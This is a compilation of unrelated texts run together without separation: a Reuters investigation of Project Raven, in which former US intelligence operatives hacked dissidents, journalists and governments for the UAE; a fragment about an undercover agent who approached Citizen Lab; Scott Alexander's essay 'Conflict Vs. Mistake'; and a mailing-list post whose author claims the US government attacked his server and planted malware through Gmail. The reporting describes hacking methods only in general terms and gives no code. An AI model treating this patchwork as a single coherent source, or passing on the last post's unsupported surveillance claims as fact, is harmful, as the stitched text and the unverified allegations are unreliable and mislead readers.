WASHINGTON (Reuters) - Two weeks after leaving her position as an intelligence analyst for the U.S. National Security Agency in 2014, Lori Stroud was in the Middle East working as a hacker for an Arab monarchy.
She had joined Project Raven, a clandestine team that included more than a dozen former U.S. intelligence operatives recruited to help the United Arab Emirates engage in surveillance of other governments, militants and human rights activists critical of the monarchy.
Stroud and her team, working from a converted mansion in Abu Dhabi known internally as “the Villa,” would use methods learned from a decade in the U.S intelligence community to help the UAE hack into the phones and computers of its enemies.
Stroud had been recruited by a Maryland cyber security contractor to help the Emiratis launch hacking operations, and for three years, she thrived in the job. But in 2016, the Emiratis moved Project Raven to a UAE cyber security firm named DarkMatter. Before long, Stroud and other Americans involved in the effort say they saw the mission cross a red line: targeting fellow Americans for surveillance.
“I am working for a foreign intelligence agency who is targeting U.S. persons,” she told Reuters. “I am officially the bad kind of spy.”
The story of Project Raven reveals how former U.S. government hackers have employed state-of-the-art cyber-espionage tools on behalf of a foreign intelligence service that spies on human rights activists, journalists and political rivals.
Interviews with nine former Raven operatives, along with a review of thousands of pages of project documents and emails, show that surveillance techniques taught by the NSA were central to the UAE’s efforts to monitor opponents. The sources interviewed by Reuters were not Emirati citizens.
The operatives utilized an arsenal of cyber tools, including a cutting-edge espionage platform known as Karma, in which Raven operatives say they hacked into the iPhones of hundreds of activists, political leaders and suspected terrorists. Details of the Karma hack were described in a separate Reuters article today.
An NSA spokesman declined to comment on Raven. An Apple spokeswoman declined to comment. A spokeswoman for UAE’s Ministry of Foreign Affairs declined to comment. The UAE’s Embassy in Washington and a spokesman for its National Media Council did not respond to requests for comment.
The UAE has said it faces a real threat from violent extremist groups and that it is cooperating with the United States on counter-terrorism efforts. Former Raven operatives say the project helped NESA break up an ISIS network within the Emirates. When an ISIS-inspired militant stabbed to death a teacher in Abu Dhabi in 2014, the operatives say, Raven spearheaded the UAE effort to assess if other attacks were imminent.
Various reports have highlighted the ongoing cyber arms race in the Middle East, as the Emirates and other nations attempt to sweep up hacking weapons and personnel faster than their rivals. The Reuters investigation is the first to reveal the existence of Project Raven, providing a rare inside account of state hacking operations usually shrouded in secrecy and denials.
The Raven story also provides new insight into the role former American cyberspies play in foreign hacking operations. Within the U.S. intelligence community, leaving to work as an operative for another country is seen by some as a betrayal. “There’s a moral obligation if you’re a former intelligence officer from becoming effectively a mercenary for a foreign government,” said Bob Anderson, who served as executive assistant director of the Federal Bureau of Investigation until 2015.
While this activity raises ethical dilemmas, U.S. national security lawyers say the laws guiding what American intelligence contractors can do abroad are murky. Though it’s illegal to share classified information, there is no specific law that bars contractors from sharing more general spycraft knowhow, such as how to bait a target with a virus-laden email.
The rules, however, are clear on hacking U.S. networks or stealing the communications of Americans. “It would be very illegal,” said Rhea Siers, former NSA deputy assistant director for policy.
The hacking of Americans was a tightly held secret even within Raven, with those operations led by Emiratis instead. Stroud’s account of the targeting of Americans was confirmed by four other former operatives and in emails reviewed by Reuters.
The FBI is now investigating whether Raven’s American staff leaked classified U.S. surveillance techniques and if they illegally targeted American computer networks, according to former Raven employees interviewed by federal law enforcement agents. Stroud said she is cooperating with that investigation. No charges have been filed and it is possible none will emerge from the inquiry. An FBI spokeswoman declined to comment.
PURPLE BRIEFING, BLACK BRIEFING
Stroud is the only former Raven operative willing to be named in this story; eight others who described their experiences would do so only on condition of anonymity. She spent a decade at the NSA, first as a military service member from 2003 to 2009 and later as a contractor in the agency for the giant technology consultant Booz Allen Hamilton from 2009 to 2014. Her specialty was hunting for vulnerabilities in the computer systems of foreign governments, such as China, and analyzing what data should be stolen.
In 2013, her world changed. While stationed at NSA Hawaii, Stroud says, she made the fateful recommendation to bring a Dell technician already working in the building onto her team. That contractor was Edward Snowden.
“He’s former CIA, he’s local, he’s already cleared,” Stroud, 37, recalled. “He’s perfect!” Booz and the NSA would later approve Snowden’s transfer, providing him with even greater access to classified material.
Two months after joining Stroud’s group, Snowden fled the United States and passed on thousands of pages of top secret program files to journalists, detailing the agency’s massive data collection programs. In the maelstrom that followed, Stroud said her Booz team was vilified for unwittingly enabling the largest security breach in agency history.
“Our brand was ruined,” she said of her team.
In the wake of the scandal, Marc Baier, a former colleague at NSA Hawaii, offered her the chance to work for a contractor in Abu Dhabi called CyberPoint. In May 2014, Stroud jumped at the opportunity and left Booz Allen.
CyberPoint, a small cyber security contractor headquartered in Baltimore, was founded by an entrepreneur named Karl Gumtow in 2009. Its clients have included the U.S. Department of Defense, and its UAE business has gained media attention.
In an interview, Gumtow said his company was not involved in any improper actions.
Stroud had already made the switch from government employee to Booz Allen contractor, essentially performing the same NSA job at higher pay. Taking a job with CyberPoint would fulfill a lifelong dream of deploying to the Middle East and doing so at a lucrative salary. Many analysts, like Stroud, were paid more than $200,000 a year, and some managers received salaries and compensation above $400,000.
She understood her new job would involve a counterterrorism mission in cooperation with the Emiratis, a close U.S. ally in the fight against ISIS, but little else. Baier and other Raven managers assured her the project was approved by the NSA, she said. With Baier’s impressive resume, including time in an elite NSA hacking unit known as Tailored Access Operations, the pledge was convincing. Baier did not respond to multiple phone calls, text messages, emails, and messages on social media.
In the highly secretive, compartmentalized world of intelligence contracting, it isn’t unusual for recruiters to keep the mission and client from potential hires until they sign non-disclosure documents and go through a briefing process.
When Stroud was brought into the Villa for the first time, in May 2014, Raven management gave her two separate briefings, back-to-back.
In the first, known internally as the “Purple briefing,” she said she was told Raven would pursue a purely defensive mission, protecting the government of the UAE from hackers and other threats. Right after the briefing ended, she said she was told she had just received a cover story.
She then received the “Black briefing,” a copy of which was reviewed by Reuters. Raven is “the offensive, operational division of NESA and will never be acknowledged to the general public,” the Black memo says. The NESA, or National Electronic Security Authority, was the UAE’s version of the NSA.
Stroud would be part of Raven’s analysis and target-development shop, tasked with helping the government profile its enemies online, hack them and collect data. Those targets were provided by the client, NESA, now called the Signals Intelligence Agency.
The language and secrecy of the briefings closely mirrored her experience at the NSA, Stroud said, giving her a level of comfort.
The information scooped up by Raven was feeding a security apparatus that has drawn international criticism. The Emirates, a wealthy federation of seven Arab sheikhdoms with a population of 9 million, is an ally of neighbor Saudi Arabia and rival of Iran.
Like those two regional powers, the UAE has been accused of suppressing free speech, detaining dissidents and other abuses by groups such as Human Rights Watch. The UAE says it is working closely with Washington to fight extremism “beyond the battlefield” and is promoting efforts to counter the “root causes” of radical violence.
Raven’s targets eventually would include militants in Yemen, foreign adversaries such as Iran, Qatar and Turkey, and individuals who criticized the monarchy, said Stroud and eight other former Raven operatives. Their accounts were confirmed by hundreds of Raven program documents reviewed by Reuters.
Under orders from the UAE government, former operatives said, Raven would monitor social media and target people who security forces felt had insulted the government.
“Some days it was hard to swallow, like [when you target] a 16-year-old kid on Twitter,” she said. “But it’s an intelligence mission, you are an intelligence operative. I never made it personal.”
The Americans identified vulnerabilities in selected targets, developed or procured software to carry out the intrusions and assisted in monitoring them, former Raven employees said. But an Emirati operative would usually press the button on an attack. This arrangement was intended to give the Americans “plausible deniability” about the nature of the work, said former Raven members.
TARGETING ‘GYRO’ AND ‘EGRET’
Stroud discovered that the program took aim not just at terrorists and foreign government agencies, but also dissidents and human rights activists. The Emiratis categorized them as national security targets.
Following the Arab Spring protests and the ousting of Egyptian President Hosni Mubarak in 2011, Emirati security forces viewed human rights advocates as a major threat to “national stability,” records and interviews show.

One of the program’s key targets in 2012 was Rori Donaghy, according to former Raven operatives and program documents. Donaghy, then 25, was a British journalist and activist who authored articles critical of the country’s human rights record. In 2012, he wrote an opinion piece for the Guardian criticizing the UAE government’s activist crackdown and warning that, if it continued, “those in power face an uncertain future.”
Before 2012, the former operatives said, the nascent UAE intelligence-gathering operation largely relied on Emirati agents breaking into the homes of targets while they were away and physically placing spyware on computers. But as the Americans built up Raven, the remote hacking of Donaghy offered the contractors a tantalizing win they could present to the client.
Because of sensitivity over human rights violations and press freedom in the West, the operation against a journalist-activist was a gamble. “The potential risk to the UAE Government and diplomatic relations with Western powers is great if the operation can be traced back to UAE,” 2012 program documents said.
To get close to Donaghy, a Raven operative should attempt to “ingratiate himself to the target by espousing similar beliefs,” the cyber-mercenaries wrote. Donaghy would be “unable to resist an overture of this nature,” they believed.
Posing as a single human rights activist, Raven operatives emailed Donaghy asking for his help to “bring hope to those who are long suffering,” the email message said.
The operative convinced Donaghy to download software he claimed would make messages “difficult to trace.” In reality, the malware allowed the Emiratis to continuously monitor Donaghy’s email account and Internet browsing. The surveillance against Donaghy, who was given the codename Gyro, continued under Stroud and remained a top priority for the Emirates for years, Stroud said.
Donaghy eventually became aware that his email had been hacked. In 2015, after receiving another suspicious email, he contacted a security researcher at Citizen Lab, a Canadian human rights and digital privacy group, who discovered hackers had been attempting for years to breach his computer.
Reached by phone in London, Donaghy, now a graduate student pursuing Arab studies, expressed surprise he was considered a top national security target for five years. Donaghy confirmed he was targeted using the techniques described in the documents.
“I’m glad my partner is sitting here as I talk on the phone because she wouldn’t believe it,” he said. Told the hackers were American mercenaries working for the UAE, Donaghy, a British citizen, expressed surprise and disgust. “It feels like a betrayal of the alliance we have,” he said.
Stroud said her background as an intelligence operative made her comfortable with human rights targets as long as they weren’t Americans. “We’re working on behalf of this country’s government, and they have specific intelligence objectives which differ from the U.S., and understandably so,” Stroud said. “You live with it.”
Prominent Emirati activist Ahmed Mansoor, given the code name Egret, was another target, former Raven operatives say. For years, Mansoor publicly criticized the country’s war in Yemen, treatment of migrant workers and detention of political opponents.
In September 2013, Raven presented senior NESA officials with material taken from Mansoor’s computer, boasting of the successful collection of evidence against him. It contained screenshots of emails in which Mansoor discussed an upcoming demonstration in front of the UAE’s Federal Supreme Court with family members of imprisoned dissidents.
Raven told UAE security forces Mansoor had photographed a prisoner he visited in jail, against prison policy, “and then attempted to destroy the evidence on his computer,” said a Powerpoint presentation reviewed by Reuters.
Citizen Lab published research in 2016 showing that Mansoor and Donaghy were targeted by hackers — with researchers speculating that the UAE government was the most likely culprit. Concrete evidence of who was responsible, details on the use of American operatives, and first-hand accounts from the hacking team are reported here for the first time.
Mansoor was convicted in a secret trial in 2017 of damaging the country’s unity and sentenced to 10 years in jail. He is now held in solitary confinement, his health declining, a person familiar with the matter said.
Mansoor’s wife, Nadia, has lived in social isolation in Abu Dhabi. Neighbors are avoiding her out of fear security forces are watching.
They are correct. By June 2017 Raven had tapped into her mobile device and given her the code name Purple Egret, program documents reviewed by Reuters show.
To do so, Raven utilized a powerful new hacking tool called Karma, which allowed operatives to break into the iPhones of users around the world.
Karma allowed Raven to obtain emails, location, text messages and photographs from iPhones simply by uploading lists of numbers into a preconfigured system, five former project employees said. Reuters had no contact with Mansoor’s wife.
Karma was particularly potent because it did not require a target to click on any link to download malicious software. The operatives understood the hacking tool to rely on an undisclosed vulnerability in Apple’s iMessage text messaging software.
In 2016 and 2017, it would be used against hundreds of targets across the Middle East and Europe, including governments of Qatar, Yemen, Iran and Turkey, documents show. Raven used Karma to hack an iPhone used by the Emir of Qatar, Sheikh Tamim bin Hamad al-Thani, as well as the phones of close associates and his brother. The embassy of Qatar in Washington did not respond to requests for comment.
WHAT WASHINGTON KNEW
Former Raven operatives believed they were on the right side of the law because, they said, supervisors told them the mission was blessed by the U.S. government.
Although the NSA wasn’t involved in day-to-day operations, the agency approved of and was regularly briefed on Raven’s activities, they said Baier told them.
CyberPoint founder Gumtow said his company was not involved in hacking operations.
“We were not doing offensive operations. Period,” Gumtow said in a phone interview. “If someone was doing something rogue, then that’s painful for me to think they would do that under our banner.”
Instead, he said, the company trained Emiratis to defend themselves through a program with the country’s Ministry of Interior.
A review of internal Raven documents shows Gumtow’s description of the program as advising the Interior Ministry on cyber defense matches an “unclassified cover story” Raven operatives were instructed to give when asked about the project. Raven employees were told to say they worked for the Information Technology and Interoperability Office, the program document said.
Providing sensitive defense technologies or services to a foreign government generally requires special licenses from the U.S. State and Commerce Departments. Both agencies declined to comment on whether they issued such licenses to CyberPoint for its operations in the UAE. They added that human rights considerations figure into any such approvals.
But a 2014 State Department agreement with CyberPoint showed Washington understood the contractors were helping launch cyber surveillance operations for the UAE. The approval document explains CyberPoint’s contract is to work alongside NESA in the “protection of UAE sovereignty” through “collection of information from communications systems inside and outside the UAE” and “surveillance analysis.”
One section of the State Department approval states CyberPoint must receive specific approval from the NSA before giving any presentations pertaining to “computer network exploitation or attack.” Reuters identified dozens of such presentations Raven gave to NESA describing attacks against Donaghy, Mansoor and others. It’s unclear whether the NSA approved Raven’s operations against specific targets.
The agreement clearly forbade CyberPoint employees from targeting American citizens or companies. As part of the agreement, CyberPoint promised that its own staff and even Emirati personnel supporting the program “will not be used to Exploit U.S. Persons, (i.e. U.S. citizens, permanent resident aliens, or U.S. companies.)” Sharing classified U.S. information, controlled military technology, or the intelligence collection methods of U.S. agencies was also prohibited.
Gumtow declined to discuss the specifics of the agreement. “To the best of my ability and to the best of my knowledge, we did everything as requested when it came to U.S. rules and regulations,” he said. “And we provided a mechanism for people to come to me if they thought that something that was done was wrong.”
An NSA spokesman declined to comment on Project Raven.
A State Department spokesman declined to comment on the agreement but said such licenses do not authorize people to engage in human rights abuses.
By late 2015, some Raven operatives said their missions became more audacious.
For instance, instead of being asked to hack into individual users of an Islamist Internet forum, as before, the American contractors were called on to create computer viruses that would infect every person visiting a flagged site. Such wholesale collection efforts risked sweeping in the communications of American citizens, stepping over a line the operators knew well from their NSA days.
U.S. law generally forbids the NSA, CIA and other U.S. intelligence agencies from monitoring U.S. citizens.
Working together with managers, Stroud helped create a policy for what to do when Raven swept up personal data belonging to Americans. The former NSA employees were instructed to mark that material for deletion. Other Raven operatives would also be notified so the American victims could be removed from future collection.
As time went on, Stroud noticed American data flagged for removal show up again and again in Raven’s NESA-controlled data stores.
Still, she found the work exhilarating. “It was incredible because there weren’t these limitations like there was at the NSA. There wasn’t that bullshit red tape,” she said. “I feel like we did a lot of good work on counterterrorism.”
DARKMATTER AND DEPARTURES
When Raven was created in 2009, Abu Dhabi had little cyber expertise. The original idea was for Americans to develop and run the program for five to 10 years until Emirati intelligence officers were skilled enough to take over, documents show. By 2013, the American contingent at Raven numbered between a dozen and 20 members at any time, accounting for the majority of the staff.
In late 2015, the power dynamic at the Villa shifted as the UAE grew more uncomfortable with a core national security program being controlled by foreigners, former staff said. Emirati defense officials told Gumtow they wanted Project Raven to be run through a domestic company, named DarkMatter.

Raven’s American creators were given two options: Join DarkMatter or go home.
At least eight operatives left Raven during this transition period. Some said they left after feeling unsettled about the vague explanations Raven managers provided when pressed on potential surveillance against other Americans.
DarkMatter was founded in 2014 by Faisal Al Bannai, who also created Axiom, one of the largest sellers of mobile devices in the region. DarkMatter markets itself as an innovative developer of defensive cyber technology. A 2016 Intercept article reported the company assisted UAE’s security forces in surveillance efforts and was attempting to recruit foreign cyber experts.
The Emirati company of more than 650 employees publicly acknowledges its close business relationship to the UAE government, but denies involvement in state-backed hacking efforts.
Project Raven’s true purpose was kept secret from most executives at DarkMatter, former operatives said.
DarkMatter did not respond to requests for comment. Al Bannai and the company’s current chief executive, Karim Sabbagh, did not respond to interview requests. A spokeswoman for the UAE Ministry of Foreign Affairs declined to comment.
Under DarkMatter, Project Raven continued to operate in Abu Dhabi from the Villa, but pressure escalated for the program to become more aggressive.
Before long, senior NESA officers were given more control over daily functions, former Raven operatives said, often leaving American managers out of the loop. By mid-2016, the Emirates had begun making an increasing number of sections of Raven hidden from the Americans still managing day-to-day operations. Soon, an “Emirate-eyes only” designation appeared for some hacking targets.
FBI QUESTIONS
By 2016, FBI agents began approaching DarkMatter employees reentering the United States to ask about Project Raven, three former operatives said.
The FBI wanted to know: Had they been asked to spy on Americans? Did classified information on U.S. intelligence collection techniques and technologies end up in the hands of the Emiratis?
Two agents approached Stroud in 2016 at Virginia’s Dulles airport as she was returning to the UAE after a trip home. Stroud, afraid she might be under surveillance by the UAE herself, said she brushed off the FBI investigators. “I’m not telling you guys jack,” she recounted.
Stroud had been promoted and given even more access to internal Raven databases the previous year. A lead analyst, her job was to probe the accounts of potential Raven targets and learn what vulnerabilities could be used to penetrate their email or messaging systems.
Targets were listed in various categories, by country. Yemeni targets were in the “brown category,” for example. Iran was gray.
One morning in spring 2017, after she finished her own list of targets, Stroud said she began working on a backlog of other assignments intended for a NESA officer. She noticed that a passport page of an American was in the system. When Stroud emailed supervisors to complain, she was told the data had been collected by mistake and would be deleted, according to an email reviewed by Reuters.
Concerned, Stroud began searching a targeting request list usually limited to Raven’s Emirati staff, which she was still able to access because of her role as lead analyst. She saw that security forces had sought surveillance against two other Americans.
When she questioned the apparent targeting of Americans, she received a rebuke from an Emirati colleague for accessing the targeting list, the emails show. The target requests she viewed were to be processed by “certain people. You are not one of them,” the Emirati officer wrote.
Days later, Stroud said she came upon three more American names on the hidden targeting queue.
Those names were in a category she hadn’t seen before: the “white category” — for Americans. This time, she said, the occupations were listed: journalist.
“I was sick to my stomach,” she said. “It kind of hit me at that macro level realizing there was a whole category for U.S. persons on this program.”
Once more, she said she turned to manager Baier. He attempted to downplay the concern and asked her to drop the issue, she said. But he also indicated that any targeting of Americans was supposed to be done by Raven’s Emirate staff, said Stroud and two other people familiar with the discussion.
Stroud’s account of the incidents was confirmed by four other former employees and emails reviewed by Reuters.
When Stroud kept raising questions, she said, she was put on leave by superiors, her phones and passport were taken, and she was escorted from the building. Stroud said it all happened so quickly she was unable to recall the names of the three U.S. journalists or other Americans she came across in the files. “I felt like one of those national security targets,” she said. “I’m stuck in the country, I’m being surveilled, I can’t leave.”
After two months, Stroud was allowed to return to America. Soon after, she fished out the business card of the FBI agents who had confronted her at the airport.
“I don’t think Americans should be doing this to other Americans,” she told Reuters. “I’m a spy, I get that. I’m an intelligence officer, but I’m not a bad one.”

Another update:
“Michel Lambert” is a pseudonym and the Paris company he claimed to represent does not exist. The New York Times, in collaboration with Uvda, an investigative television show on Israel’s Channel 12, has confirmed that the mysterious visitor was Aharon Almog-Assoulin, a retired Israeli security official who until recently served on the town council in a suburb of Tel Aviv.
The phenomenon of private spies drew widespread attention in 2017, when Black Cube, an Israeli private intelligence firm, was found to have used undercover agents to approach women who had accused Harvey Weinstein, the Hollywood producer, of sexual misconduct. Black Cube later was identified as having sent agents, again under false cover, to investigate Obama administration officials who had worked on the Iran nuclear deal.
Black Cube denied that it had played any role in approaching Citizen Lab employees, but the same undercover agent turned up in an earlier case in Canada with a Black Cube connection.

Conflict Vs. Mistake
Posted on [January 24, 2018]( by [Scott Alexander](
Jacobite – which is apparently still a real magazine and not a one-off gag making fun of Jacobin – summarizes their article [Under-Theorizing Government]( as “You’ll never hear the terms ‘principal-agent problem,’ ‘rent-seeking,’ or ‘aligning incentives’ from socialists. That’s because they expect ideology to solve all practical considerations of governance.”
There have been some really weird and poorly-informed socialist critiques of public choice theory lately, and this article generalizes from those to a claim that Marxists just don’t like considering the hard technical question of how to design a good government. This would explain why their own governments so often fail. Also why, whenever existing governments are bad, Marxists immediately jump to the conclusion that they must be run by evil people who want them to be bad on purpose.
In trying to think of how a Marxist might respond to this attack, I thought of commenter no_bear_so_low’s [conflict vs. mistake dichotomy]( (itself related to the [three perspectives of sociology]( To massively oversimplify:
Mistake theorists treat politics as science, engineering, or medicine. The State is diseased. We’re all doctors, standing around arguing over the best diagnosis and cure. Some of us have good ideas, others have bad ideas that wouldn’t help, or that would cause too many side effects.
Conflict theorists treat politics as war. Different blocs with different interests are forever fighting to determine whether the State exists to enrich the Elites or to help the People.
Mistake theorists view debate as essential. We all bring different forms of expertise to the table, and once we all understand the whole situation, we can use wisdom-of-crowds to converge on the treatment plan that best fits the need of our mutual patient, the State. Who wins on any particular issue is less important creating [an environment where truth can generally prevail]( over the long term.
Conflict theorists view debate as having a minor clarifying role at best. You can “debate” with your boss over whether or not you get a raise, but only with the shared understanding that you’re naturally on opposite sides, and the “winner” will be based less on objective moral principles than on how much power each of you has. If your boss appeals too many times to objective moral principles, he’s probably offering you a crappy deal.
Mistake theorists treat different sides as symmetrical. There’s the side that wants to increase the interest rate, and the side that wants to decrease it. Both sides have about the same number of people. Both sides include some trustworthy experts and some loudmouth trolls. Both sides are equally motivated by trying to get a good economy. The only interesting difference is which one turns out (after all the statistics have been double-checked and all the relevant points have been debated) to be right about the matter at hand.
Conflict theorists treat the asymmetry of sides as their first and most important principle. The Elites are few in number, but have lots of money and influence. The People are many but poor – yet their spirit is indomitable and their hearts are true. The Elites’ strategy will always be to sow dissent and confusion; the People’s strategy must be to remain united. Politics is won or lost by how well each side plays its respective hand.
Mistake theorists love worrying about the complicated and paradoxical effects of social engineering. Did you know that anti-drug programs in school actually increase drug use? Did you know that many studies find raising the minimum wage hurts the poor? Did you know that executing criminals actually costs more money than imprisoning them for life? This is why we can’t trust our intuitions about policy, and we need to have lots of research and debate, and eventually trust what the scientific authorities tell us.
Conflict theorists think this is more often a convenient excuse than a real problem. The Elites get giant yachts, and the People are starving to death on the streets. And as soon as somebody says that maybe we should take a little bit of the Elites’ money to feed the People, some Elite shill comes around with a glossy PowerPoint presentation explaining why actually this would cause the Yellowstone supervolcano to erupt and kill everybody. And just enough People believe this that nobody ever gets around to achieving economic justice, and the Elites buy even bigger yachts, and the People keep starving.
Mistake theorists think you can save the world by increasing intelligence. You make technocrats smart enough to determine the best policy. You make politicians smart enough to choose the right technocrats and implement their advice effectively. And you make voters smart enough to recognize the smartest politicians and sweep them into office.
Conflict theorists think you can save the world by increasing passion. The rich and powerful win because they already work together effectively; the poor and powerless will win only once they unite and stand up for themselves. You want activists tirelessly informing everybody of the important causes that they need to fight for. You want community organizers forming labor unions or youth groups. You want protesters ready on short notice whenever the enemy tries to pull a fast one. And you want voters show up every time, and who know which candidates are really fighting for the people vs. just astroturfed shills.
For a mistake theorist, passion is inadequate or even suspect. Wrong people can be just as loud as right people, sometimes louder. If two doctors are debating the right diagnosis in a difficult case, and the patient’s crazy aunt hires someone to shout “IT’S LUPUS!” really loud in front of their office all day, that’s not exactly helping matters. If a group of pro-lupus protesters block the entry to the hospital and refuse to let any of the staff in until the doctors agree to diagnose lupus, that’s a disaster. All that passion does is use pressure or even threats to introduce bias into the important work of debate and analysis.
For a conflict theorist, intelligence is inadequate or even suspect. It doesn’t take a supergenius to know that poor farm laborers working twelve hour days in the scorching heat deserve more than a $9/hour minimum wage when the CEO makes $9 million. The supergenius is the guy with the PowerPoint presentation saying this will make the Yellowstone supervolcano erupt.
Mistake theorists think that free speech and open debate are vital, the most important things. Imagine if your doctor said you needed a medication from Pfizer – but later you learned that Pfizer owned the hospital, and fired doctors who prescribed other companies’ drugs, and that the local medical school refused to teach anything about non-Pfizer medications, and studies claiming Pfizer medications had side effects were ruthlessly suppressed. It would be a total farce, and you’d get out of that hospital as soon as possible into one that allowed all viewpoints.
Conflict theorists think of free speech and open debate about the same way a 1950s Bircher would treat avowed Soviet agents coming into neighborhoods and trying to convince people of the merits of Communism. Or the way the average infantryman would think of enemy planes dropping pamphlets saying “YOU CANNOT WIN, SURRENDER NOW”. Anybody who says it’s good to let the enemy walk in and promote enemy ideas is probably an enemy agent.
Mistake theorists think it’s silly to complain about George Soros, or the Koch brothers. The important thing is to evaluate the arguments; it doesn’t matter who developed them.
Conflict theorists think that stopping George Soros / the Koch brothers is the most important thing in the world. Also, they’re going to send me angry messages saying I’m totally unfair to equate righteous crusaders for the People like George Soros / the Koch brothers with evil selfish arch-Elites like the Koch brothers / George Soros.
Mistake theorists think racism is a cognitive bias. White racists have mistakenly inferred that black people are dumber or more criminal. Mistake theorists find narratives about racism useful because they’re a sort of ur-mistake that helps explain how people could make otherwise inexplicable mistakes, like electing Donald Trump or opposing [preferred policy].
Conflict theorists think racism is a conflict between races. White racists aren’t suffering from a cognitive bias, and they’re not mistaken about anything: they’re correct that white supremacy puts them on top, and hoping to stay there. Conflict theorists find narratives about racism useful because they help explain otherwise inexplicable alliances, like why working-class white people have allied with rich white capitalists.
When mistake theorists [criticize]( [democracy]( it’s because it gives too much power to the average person – who isn’t very smart, and who tends to do things like vote against carbon taxes because they don’t believe in global warming. They fantasize about a technocracy in which informed experts can pursue policy insulated from the vagaries of the electorate.
When conflict theorists criticize democracy, it’s because it doesn’t give enough power to the average person – special interests can buy elections, or convince representatives to betray campaign promises in exchange for cash. They fantasize about a Revolution in which their side rises up, destroys the power of the other side, and wins once and for all.
Mistake theorists think a Revolution is stupid. After the proletariat (or the True Patriotic Americans, or whoever) have seized power, they’re still faced with the same set of policy problems we have today, and no additional options. Communism is intellectually bankrupt since [it has no good policy prescriptions]( for a communist state. If it did have good policy prescriptions for a communist state, we could test and implement those policies now, without a revolution. Karl Marx could have saved everyone a lot of trouble by being Bernie Sanders instead.
Conflict theorists think a technocracy is stupid. Whatever the right policy package is, the powerful will never let anyone implement it. Either they’ll bribe the technocrats to parrot their own preferences, or they’ll prevent their recommendations from carrying any force. The only way around this is to organize the powerless to defeat the powerful by force – after which a technocracy will be unnecessary. Bernie Sanders could have saved himself a lot of trouble by realizing everything was rigged against him from the start and becoming Karl Marx.
Mistake theorists naturally think conflict theorists are making a mistake. On the object level, they’re not smart enough to realize that new trade deals are for the good of all, or that smashing the state would actually lead to mass famine and disaster. But on the more fundamental level, the conflict theorists don’t understand the Principle of Charity, or Hanlon’s Razor of “never attribute to malice what can be better explained by stupidity”. They’re stuck at some kind of troglodyte first-square-of-the-glowing-brain-meme level where they think forming mobs and smashing things can solve incredibly complicated social engineering problems. The correct response is to teach them Philosophy 101.
(This is the Jacobite article above. It accuses Marxists of just not understanding the relevant theories. It’s saying that there’s all this great academic work about how to design a government, and Marxists are too stupid to look into it. It’s so easy to picture one doctor savaging another: “Did you even bother to study Ingerstein’s latest paper on neuroimmunology before you inflicted your idiotic opinions about this case on us?”)
Conflict theorists naturally think mistake theorists are the enemy in their conflict. On the object level, maybe they’re directly working for the Koch Brothers or the American Enterprise Institute or whoever. But on the more fundamental level, they’ve become part of a class that’s more interested in protecting its own privileges than in helping the poor or working for the good of all. The best that can be said about the best of them is that they’re trying to protect their own neutrality, unaware that in the struggle between the powerful and the powerless neutrality always favors the powerful. The correct response is to crush them.
What would the conflict theorist argument against the Jacobite piece look like? Take a second to actually think about this. Is it similar to what I’m writing right now – an explanation of conflict vs. mistake theory, and a defense of how conflict theory actually describes the world better than mistake theory does?
No. It’s the Baffler’s article saying that [public choice theory is racist, and if you believe it you’re a white supremacist]( If this wasn’t your guess, you still don’t understand that conflict theorists aren’t mistake theorists who just have a different theory about what the mistake is. They’re not going to respond to your criticism by politely explaining why you’re incorrect.
Is this uncharitable? I’m not sure. There’s a meta-level problem in trying to understand the position “don’t try to understand other positions and engage with them on their own terms” and engage with it on its own terms. If you succeed, you’ve failed, and if you fail, you’ve succeeded. I am pretty sure [it would be wrong to “steelman”]( conflict theory into a nice cooperative explanation of how we all need to join together, realize that conflict theory is objectively the correct way to think, and then use this insight to help cure our mutual patient, the State.
So if this model has any explanatory power, what do we do with it?
Consider a further distinction between easy and hard mistake theorists. Easy mistake theorists think that all our problems come from very stupid people making very simple mistakes; dumb people deny the evidence about global warming; smart people don’t. Hard mistake theorists think that the questions involved are really complicated and require more evidence than we’ve been able to collect so far – the [weird morass of conflicting minimum wage studies]( is a good example here. Obviously some questions are easier than others, but the disposition to view questions as hard or easy in general seems to separate into different people and schools of thought.
(Maybe there’s a further distinction between easy and hard conflict theorists. Easy conflict theorists think that all our problems come from cartoon-villain caricatures wanting very evil things; bad people want to kill brown people and steal their oil, good people want world peace and tolerance. Hard conflict theorists think that our problems come from clashes between differing but comprehensible worldviews – for example, people who want to lift people out of poverty through spreading modern efficient egalitarian industrial civilization, versus people who want to preserve traditional cultures with all their thorns and prickles. Obviously some moral conflicts are more black-and-white than others, but again, some people seem more inclined than others to use one of these models.)
This blog has formerly been Hard Mistake Theory Central, except that I think I previously treated conflict theorists as making an Easy Mistake. I think I was really doing the “I guess you don’t understand Philosophy 101 and realize everyone has to be charitable to each other” thing. This was wrong of me. I don’t know how excusable it was and I’m interested in seeing how many comments here are “This is super obvious” vs. “I never thought about this consciously and I think I’ve just been misunderstanding other people as behaving inexplicably badly my whole life”. But people have previously noticed that this blog is good at attracting representation from all across the political spectrum except Marxists. Maybe that’s related to treating every position except theirs with respect, and appreciating conflict theory better would fix that. I don’t know. It could be worth a shot.
Right now I think conflict theory is probably a less helpful way of viewing the world in general than mistake theory. But obviously both can be true in parts and reality can be way more complicated than either. Maybe some future posts on this, which would have to explore issues like normative vs. descriptive, where tribalism fits in here, and “the myth of the rational voter”. But overall I’m less sure of myself than before and think this deserves more treatment as a hard case that needs to be argued in more specific situations. Certainly “everyone in government is already a good person, and just has to be convinced of the right facts” is looking less plausible these days. At the very least, if I want to convince other people to my position here, I actually have to convince them – instead of using the classic Easy Mistake Theorist tactic of “smh that people still believe this stuff in the Year Of Our Lord 2018” repeated over and over again.

@_subject: Social media services support account spoofing 
back in dec 2015 the US Gov. executed an attack on my dedicated server (i describe how to detect this here:  to identify SSL/TLS MitM via behavior of request signal changes when under active interception.)
during this attack, nearly every single online service was unavailable to me - whether accessing those accounts via Tor or VPN.  this coincided with local technical surveillance efforts.
this informed me of some facts:
- US based services are at the command of the intelligence community and federal law enforcement. this is long noted (NSLs), but the mechanism is more dynamic than I expected. E.g. by account and email, in addition to IP, etc.
- US based services are used as vehicle to deploy malware to target under some circumstances. E.g. malicious javascript from Gmail web interface, not sent to other accounts.
- Denial of Service is trivial with PRISM access; e.g. a single UPDATE to target row renders accounts inaccessible. note that when all of your accounts are targeted concurrently, there is no effective account recovery process to regain control of these accounts. back up email accounts, SMS, and other recovery techniques are simply unusable.
- the services which did work were decentralized or little known. for a while my ello account contained two additional posts that i kept up to date regarding incident response during this event. (notifying of attack, revoking certificates, attempting to turn off servers, etc.)  sadly, you can see that 2 of my 5 posts were later taken down. NLSs reach everywhere, if you're a business in the US :)    - 5 posts, but only 3 available.
